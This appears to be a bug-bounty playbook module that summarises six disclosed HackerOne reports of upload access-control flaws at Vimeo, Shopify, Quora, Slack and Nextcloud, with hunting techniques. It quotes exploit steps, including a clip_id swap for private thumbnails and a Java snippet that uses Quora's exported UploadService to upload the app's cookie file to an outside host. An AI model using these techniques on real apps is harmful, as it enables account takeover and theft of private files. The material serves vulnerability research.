---
title: "Upload-ACL & cross-user file access — who may touch what was uploaded"
type: playbook
category: upload-acl
cwe: "CWE-284 · CWE-200"
source_count: 6
full_bodies_available: 6
corpus: "h1.security.nathan.sx roster (86 title-arm rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-11-05"
note: "Anchor bodies: FU-43850 (Vimeo select_thumb $1,000 list), FU-97452 (Shopify staff files $500 json), FU-258460 (Quora exported UploadService $500 list). Claims trace to bodies read 2026-11-05."
---

# Module 08 — the ACL lane: uploads carry their own access-control problems

## 1. Overview

Six rows, **$2,750/5 paid** — the vault's best *paid-density* module after 02 (every price
row small, one unpaid row). The pattern class: the upload primitive exists and is sound as
a *transfer*, but the *who-reaches-whose-files* and *who-can-list-the-shared-store*
questions were never wired. Four rows are server-side ACL (97452, 143903, 145950, 43850);
two are the mobile shift (167481 Android broadcasts; 258460 Quora's exported
third-party-SDK service). Note the pricing insight up front: 43850 tops the module at
$1,000 (list) because private-*content* reads were demonstrated — enumerate the private
resource before claiming.

**Case-stock (6 rows / $2,750):**

| Case | Target | Who bypasses whom | Bounty |
|---|---|---|---|
| [FU-43850](https://hackerone.com/reports/43850) | Vimeo | another clip's `clip_id` fetches private-video thumbnails | $1,000 (list) |
| [FU-97452](https://hackerone.com/reports/97452) | Shopify | staff without permissions reach admin-uploaded files | $500 (json) |
| [FU-258460](https://hackerone.com/reports/258460) | Quora (Android) | any third-party app through exported `UploadService` | $500 (list) |
| [FU-143903](https://hackerone.com/reports/143903) | Slack | files uploaded into another member's private IM channel | $500 (list) |
| [FU-145950](https://hackerone.com/reports/145950) | Nextcloud | no-edit user copies files into a shared folder | $250 (list) |
| [FU-167481](https://hackerone.com/reports/167481) | Nextcloud (Android) | any receiver reads upload broadcasts | - (json none) |

## 2. Anatomy

### 2.1 The shared store with the wrong read scope (97452)

**FU-97452** ($500 (json)) — Shopify's rte/assets listing, byte-true:

> ### Test #2
> If the member has NO access to the ALL sections
> 1. So we can not go to the page Products but....
> 2. Lets go here https://*.myshopify.com/admin/rte/assets
> 3. And we will see all files uploaded by admin (screenshot attached)
> 4. On this page we can simply find links for admin files

The listing endpoint *is itself the bypass* — permission on a feature ≠ permission on the
store that feature reads from.

### 2.2 The parameter mismatch on a content endpoint (43850)

**FU-43850** ($1,000 (list)) — `https://vimeo.com/upload/select_thumb` composes
`clip_id`, `token`, `time`. The body's two-step proof, byte-true:

> I changed the value of **clip_id** parameter to another video id to test some
> authorization flaw ,it seem it works because i got HTTP/1.1 200 OK  and i short json
> response that contain a url, like this one
>
> **{"success":true,"id":503302458,"url":"https:\/\/i.vimeocdn.com\/video\/503302458_100x75.jpg"}**
>
> To confirm this is a authorization flaw i make a another account and upload a private
> video in that account and get the clip_id, then make a request(https://vimeo.com/upload/select_thumb)
> to  my attacker account using that clip_id. as a result i got some thumbnails on a
> private video

and the extended claim: "if you want to get the whole video just iterate the time
**parameter**!" — a two-account A/B proof is what lifts this from suspicious-200 to $1,000.

### 2.3 The mobile shift (167481, 258460)

**FU-167481** (Nextcloud Android, resolved unpaid): `FileUploader`/`SyncFolderHandler`
emit unprotected `sendStickyBroadcast` calls; the body ships the malicious receiver XML
(`<action android:name="FileUploader.UPLOAD_START"/>` × priority 999). Its own declared
bound, byte-true: "It will disclose info about account, file info, etc" — metadata
disclosure, not file-content theft.

**FU-258460** ($500 (list)) is the one step harder — Quora ships the third-party
`net.gotev.uploadservice.UploadService` **exported**, so any installed app drives it. The
body's theft line, byte-true:

```java
        params.setServerUrl("http://google.com/zaheck");
        try {
            params.addFile(new UploadFile("/data/data/com.quora.android/app_webview/Cookies"));
```

(the destination server is attacker-chosen — arbitrary file → attacker host; "It's really
serious vulnerability which allows to takeover accounts." per the body, and the Instant
Apps note: "On the newest
Androids it also can be exploited via Instant Apps directly from a web-browser
(installation of an app is not required)."). **FU-143903** ($500 (list)) is the tiny backend
twin: "A team member can upload the files in the private IM chat channel of other
members.This can be done by using the IM channel id." **FU-145950** ($250 (list)) is its
write-side sibling: "Any invited user to a shared folder with no edit privilege can create
files in it through copy feature" (Android copy-feature gap).

## 3. Techniques (corpus-derived)

1. **Find the list/read endpoint under every upload UI** — `rte/assets`-shaped shelf pages
   ship the whole ACL bypass (97452).
2. **A/B actor test**: prove cross-user reach with a second account's content (43850's
   two-step) — the module's only repeatable proof pattern.
3. **Third-party SDK surfaces**: exported services from libraries (gotev uploadservice)
   are the mobile lane's biggest leak class (258460); prefer adding a wrapper permission
   check at the app layer.
4. **Id-object params in upload flows count as IDOR**: `clip_id` swap (43850) and IM
   channel id (143903) are the same primitive on different stores.

## 4. Kill-gates

- Broadcast rows (167481) stop at metadata — the claim ceiling is "info about account,
  file info, etc" exactly as the body words it, not arbitrary file read; read-file claims
  need 258460's service-export route.
- Imaging/ACL-hybrid confusion: replacing `clip_id` is authorization; the *thumbnail read*
  stays bounded (private videos, not admin data) — match the report's own scope.
- All mobile rows must show the third-party receiver/service manifest lines — no manifest
  lines, no export claim.
